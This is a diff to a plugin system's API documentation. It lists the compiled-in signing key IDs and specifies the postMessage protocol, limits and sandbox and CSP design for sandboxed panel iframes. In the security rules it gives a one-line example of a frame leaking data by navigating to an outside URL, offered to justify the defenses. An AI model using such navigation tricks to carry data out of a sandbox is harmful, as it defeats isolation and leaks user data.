@@ -185,8 +185,10 @@ approval, answers `409` with `plugin.key_in_use`: the plugins that would stop in
 their rows stay with `trusted: false`) and drops the updates (the installed version keeps
 running). After a restart the same holds.
 
-Kalzit's own plugin keys are compiled in (`KALZIT_PLUGIN_PUBLIC_KEYS` at build time) and are never
-listed here; release keys are never trusted for plugins.
+Kalzit's own plugin keys are compiled in (`server/src/plugins/package.rs`): the main key
+`581c30a0d8384cfd`, which the release workflow signs Kalzit's plugins with, and the offline backup
+key `df87ab1649696788`; a build may add more with `KALZIT_PLUGIN_PUBLIC_KEYS`. They are never listed
+here; release keys are never trusted for plugins.
 
 ### Hand-overs: `POST /admin/plugins/{pluginId}/handovers`
 
@@ -348,9 +350,72 @@ each call. The contract tests check per system that a plugin cannot open Kalzit'
 another plugin's, cannot write or read Kalzit's data directory, sees nothing of Kalzit's
 environment, and (Linux) cannot `ptrace` or signal Kalzit.
 
+## Panel message API
+
+Version 1, what a panel plugin's bundle and Kalzit say to each other through `postMessage` across
+the sandboxed iframe (docs/ARCHITECTURE.md, "Panel plugins"). The TypeScript types are
+`plugin-api/panel/v1/kalzit-panel.d.ts`; Kalzit checks every event with
+`kalzit_plugin_api::panel::parse_event`, whose constants are the limits below. The host side
+(serving the bundle, the iframe, sending the messages) is not built yet; the API and an example
+panel (`examples/plugins/panel-kpi`) are.
+
+Every message is a JSON object with `kalzit: "panel"`, `api: 1` and `type`.
+
+**Into the frame** (Kalzit to the panel):
+
+| `type` | Fields | When |
+|---|---|---|
+| `init` | `options` (the panel's JSON options), `size` (`width`, `height` in CSS pixels), `theme` (`scheme`: `light` or `dark`; `tokens`: Kalzit's design tokens by custom property name, resolved), `locale` (`en`, `de`), `timeZone` (IANA), `title` | the answer to `ready` |
+| `data` | `series` (per query: `refId` and `result` in its native shape as in docs/api/datasources.md, or `error`), `timeRange` (`from`, `to`), `revision` (grows with every run) | after `init`, and whenever the panel's queries ran |
+| `options` | `options` | the options changed |
+| `size` | `width`, `height` | the frame was resized |
+| `theme` | `scheme`, `tokens` | the theme changed |
+| `state` | `loading` | the panel's queries started (`true`) or ended |
+
+Results keep the query's limits; a panel cannot run queries of its own.
+
+**Out of the frame** (events, the panel to Kalzit):
+
+| `type` | Fields | Limits |
+|---|---|---|
+| `ready` | | once, after the panel listens |
+| `click` | `refId`, `target` (`row`, `document`, `node`, `edge`), `index` (row or document) or `id` (node or edge) | `refId` 1 to 64 characters, `id` at most 1024 |
+| `select` | `refId`, `rows` (indices) | at most 1000 rows |
+| `range` | `from`, `to` (Unix milliseconds) | `from` before `to` |
+| `setVariable` | `name`, `value` (a text, or a list for a multi-value variable) | a variable name of at most 64 characters; at most 100 values of at most 1024 characters, no control characters |
+| `resize` | `height` | 16 to 4000 CSS pixels; Kalzit may give less |
+
+Rules:
+
+- Enforcement lies with the panel host, which is not built yet: it runs `parse_event` on every
+  event and keeps the rate limit per panel. Until it exists, nothing receives panel events; the
+  rules below are what the host will hold a bundle to.
+- An event is at most 16 KiB of JSON; Kalzit takes at most 20 events per second per panel and
+  drops the rest. An event of another `api`, an unknown `type` or a field out of its range is
+  dropped (`panel.not_json`, `panel.not_envelope`, `panel.api_unsupported`, `panel.type_unknown`,
+  `panel.field_invalid`, `panel.too_large`, shown in the browser console). Unknown fields are
+  ignored and never passed on.
+- `setVariable` sets a variable only when the dashboard has it; `click`, `select` and `range` act
+  like the same gestures on built-in panels.
+- Both sides accept messages only from the other window (`event.source`): the frame's origin is
+  opaque (`null`), so origins say nothing.
+- For the host's design: `connect-src 'none'` stops requests, but a frame can still carry data
+  out by navigating, itself (`location = "https://elsewhere/?data"`), a new window or the top
+  page. The host therefore loads the bundle with `sandbox="allow-scripts"` only (no
+  `allow-top-navigation`, `allow-popups` or `allow-forms`), serves the frame document and the
+  bundle with a strict Content Security Policy of their own (`default-src 'none'`, the bundle as
+  the only script, no `form-action`, `base-uri 'none'`), and blocks the frame's own navigation
+  away from the bundle's document (CSP `navigate-to` where browsers support it; otherwise the
+  host treats a navigation of the frame, seen as a new `load` event, as a breach and removes the
+  panel).
+- Evolution: version 1 grows only by new optional fields and new message types. A panel ignores
+  types and fields it does not know; Kalzit speaks to a bundle in the version its manifest names
+  (`[panel] api`) and refuses versions it does not know at install.
+
 ## Not here yet
 
-- Panel plugins (the bundle, the sandboxed iframe and the message API).
+- The panel host: serving installed panel bundles, the sandboxed iframe and the message
+  exchange above. Panel packages are refused at install meanwhile (`plugin.kind_unsupported`).
 - The catalog (signed index, downloads).
 - Kalzit's connector for plugin network access, and with it network isolation on both systems.
 - `Release` calls when a data source changes or is deleted (plugins key their pools by
